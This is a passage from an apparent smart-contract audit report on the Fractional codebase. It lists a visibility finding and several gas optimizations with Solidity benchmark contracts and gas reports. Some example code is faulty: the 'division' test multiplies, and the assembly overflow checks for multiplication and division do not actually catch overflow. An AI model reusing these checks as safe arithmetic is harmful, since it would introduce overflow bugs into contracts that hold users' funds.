called by the contract should be declared `external`  Contracts are allowed to override their parents' functions and change the visibility from `external` to `public` if required.    _There are 6 instances of this issue:_  ``` File: src/FERC1155.sol  256    function safeTransferFrom( 257        address _from, 258        address _to, 259        uint256 _id, 260        uint256 _amount, 261        bytes memory _data 262:    ) public override(ERC1155, IFERC1155) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L256-L262  ``` File: src/FERC1155.sol  291    function uri(uint256 _id) 292        public 293        view 294        override(ERC1155, IFERC1155) 295        returns (string memory) 296:    { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L291-L296  ``` File: src/utils/MerkleBase.sol  43    function verifyProof( 44        bytes32 _root, 45        bytes32[] memory _proof, 46        bytes32 _valueToProve 47:   ) public pure returns (bool) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L43-L47  ``` File: src/utils/MerkleBase.sol  61:    function getRoot(bytes32[] memory _data) public pure returns (bytes32) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L61  ``` File: src/utils/MerkleBase.sol  73    function getProof(bytes32[] memory _data, uint256 _node) 74        public 75        pure 76        returns (bytes32[] memory) 77:   { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L73-L77  ``` File: src/utils/Metadata.sol  36    function uri(uint256 _id) public view returns (string memory) { 37        return tokenMetadata[_id]; 38:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L36-L38
# Gas Optimizations The following sections detail the gas optimizations found throughout the codebase. Each optimization is documented with the setup, an explainer for the optimization, a gas report and line identifiers for each optimization across the codebase. For each section's gas report, the optimizer was turned on and set to 10000 runs. You can replicate any tests/gas reports by heading to [0xKitsune/gas-lab](https://github.com/0xKitsune/gas-lab) and cloning the repo. Then, simply copy/paste the contract examples from any section and run `forge test --gas-report`. You can also easily update the optimizer runs in the `foundry.toml`.  ---     ## Use assembly for math (add, sub, mul, div)  Use assembly for math instead of Solidity. You can check for overflow/underflow in assembly to ensure safety. If using Solidity versions < 0.8.0 and you are using Safemath, you can gain significant gas savings by using assembly to calculate values and checking for overflow/underflow.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;     Contract5 c5;     Contract6 c6;     Contract7 c7;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();         c5 = new Contract5();         c6 = new Contract6();         c7 = new Contract7();     }      function testGas() public {         c0.addTest(34598345, 100);         c1.addAssemblyTest(34598345, 100);         c2.subTest(34598345, 100);         c3.subAssemblyTest(34598345, 100);         c4.mulTest(34598345, 100);         c5.mulAssemblyTest(34598345, 100);         c6.divTest(34598345, 100);         c7.divAssemblyTest(34598345, 100);     } }  contract Contract0 {     //addition in Solidity     function addTest(uint256 a, uint256 b) public pure {         uint256 c = a + b;     } }  contract Contract1 {     //addition in assembly     function addAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := add(a, b)              if lt(c, a) {                 mstore(0x00, "overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract2 {     //subtraction in Solidity     function subTest(uint256 a, uint256 b) public pure {         uint256 c = a - b;     } }  contract Contract3 {     //subtraction in assembly     function subAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := sub(a, b)              if gt(c, a) {                 mstore(0x00, "underflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //multiplication in Solidity     function mulTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract5 {     //multiplication in assembly     function mulAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := mul(a, b)              if lt(c, a) {                 mstore(0x00, "overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract6 {     //division in Solidity     function divTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract7 {     //division in assembly     function divAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := div(a, b)              if gt(c, a) {                 mstore(0x00, "underflow")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js  ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 40493              ┆ 233             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addTest            ┆ 303             ┆ 303 ┆ 303    ┆ 303 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37087              ┆ 216             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addAssemblyTest    ┆ 263             ┆ 263 ┆ 263    ┆ 263 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract2 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 40293              ┆ 232             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ subTest            ┆ 300             ┆ 300 ┆ 300    ┆ 300 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract3 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ subAssemblyTest    ┆ 263             ┆ 263 ┆ 263    ┆ 263 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract4 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 41893              ┆ 240             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mulTest            ┆ 325             ┆ 325 ┆ 325    ┆ 325 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract5 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37087              ┆ 216             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mulAssemblyTest    ┆ 265             ┆ 265 ┆ 265    ┆ 265 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract6 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 41893              ┆ 240             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ divTest            ┆ 325             ┆ 325 ┆ 325    ┆ 325 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract7 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ divAssemblyTest    ┆ 265             ┆ 265 ┆ 265    ┆ 265 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines - FERC1155.sol:247  - Buyout.sol:86  - Buyout.sol:87  - Buyout.sol:88  - Buyout.sol:124  - Buyout.sol:138  - Buyout.sol:161  - Buyout.sol:165  - Buyout.sol:202  - Buyout.sol:209  - Buyout.sol:268  - Buyout.sol:269  - VaultFactory.sol:77  - Vault.sol:128  - MerkleBase.sol:92  - MerkleBase.sol:93  - MerkleBase.sol:97  - MerkleBase.sol:100  - MerkleBase.sol:107  - MerkleBase.sol:112  - MerkleBase.sol:136  - MerkleBase.sol:137  - MerkleBase.sol:138  - MerkleBase.sol:142  - MerkleBase.sol:147  - MerkleBase.sol:148  - Migration.sol:194  - Migration.sol:471  - Migration.sol:527  - Migration.sol:528  - Migration.sol:544  - Migration.sol:545   --- ## Right shift instead of dividing by two  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.div2();         c1.shr2();     } }  contract Contract0 {     function div2() public view {         uint256 val = 10;         uint256 valDivTwo = val / 2;         valDivTwo++;     } }  contract Contract1 {     function shr2() public view {         uint256 val = 10;         uint256 valDivTwo = val >> 1;         valDivTwo++;     } } ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 41493              ┆ 238             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ div2               ┆ 268             ┆ 268 ┆ 268    ┆ 268 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 32687              ┆ 193             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ shr2               ┆ 203             ┆ 203 ┆ 203    ┆ 203 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines - MerkleBase.sol:100  - MerkleBase.sol:136  - MerkleBase.sol:142   ---  ## Cache array length during for loop definition. A typical for loop definition may look like: `for (uint256 i; i < arr.length; i++){}`. Instead of using `array.length`, cache the array length before the loop, and use the cached value to safe gas. This will avoid an `MLOAD` every loop for arrays stored in memory and an `SLOAD` for arrays stored in storage. This can have significant gas savings for arrays with a large length, especially if the array is stored in storage.   ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();     }      function testGas() public view {         uint256[] memory arr = new uint256[](10);         c0.nonCachedMemoryListLength(arr);         c1.cachedMemoryListLength(arr);         c2.nonCachedStorageListLength();         c3.cachedStorageListLength();     } }  contract Contract0 {     function nonCachedMemoryListLength(uint256[] memory arr) public pure {         uint256 j;         for (uint256 i; i < arr.length; i++) {             j = arr[i] + 10;         }     } }  contract Contract1 {     function cachedMemoryListLength(uint256[] memory arr) public pure {         uint256 j;          uint256 length = arr.length;         for (uint256 i; i < length; i++) {             j = arr[i] + 10;         }     } }  contract Contract2 {     uint256[] arr = new uint256[](10);      function nonCachedStorageListLength() public view {         uint256 j;         for (uint256 i; i < arr.length; i++) {             j = arr[i] + 10;         }     } }  contract Contract3 {     uint256[] arr = new uint256[](10);      function cachedStorageListLength() public view {         uint256 j;         uint256 length = arr.length;          for (uint256 i; i < length; i++) {             j = arr[i] + 10;         }     } }   ```  ### Gas Report ```js ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 128171                                    ┆ 672             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ nonCachedMemoryListLength                 ┆ 3755            ┆ 3755 ┆ 3755   ┆ 3755 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ src/test/GasTest.t.sol:Contract1 contract ┆                 ┆      ┆        ┆      ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 128777                                    ┆ 675             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ cachedMemoryListLength                    ┆ 3733            ┆ 3733 ┆ 3733   ┆ 3733 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ src/test/GasTest.t.sol:Contract2 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 118474                                    ┆ 539             ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ nonCachedStorageListLength                ┆ 27979           ┆ 27979 ┆ 27979  ┆ 27979 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯ ╭───────────────────────────────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ src/test/GasTest.t.sol:Contract3 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost                           ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 118674                                    ┆ 540             ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ cachedStorageListLength                   ┆ 26984           ┆ 26984 ┆ 26984  ┆ 26984 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯  ``` ### Lines - Buyout.sol:454  - MerkleBase.sol:51  - MerkleBase.sol:110  - BaseVault.sol:64  - BaseVault.sol:83  - BaseVault.sol:107  - BaseVault.sol:130   ---  ## Use assembly to write storage values  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public {         c0.updateOwner(0x158B28A1b1CB1BE12C6bD8f5a646a0e3B2024734);         c1.assemblyUpdateOwner(0x158B28A1b1CB1BE12C6bD8f5a646a0e3B2024734);     } }  contract Contract0 {     address owner = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;      function updateOwner(address newOwner) public {         owner = newOwner;     } }  contract Contract1 {     address owner = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;      function assemblyUpdateOwner(address newOwner) public {         assembly {             sstore(owner.slot, 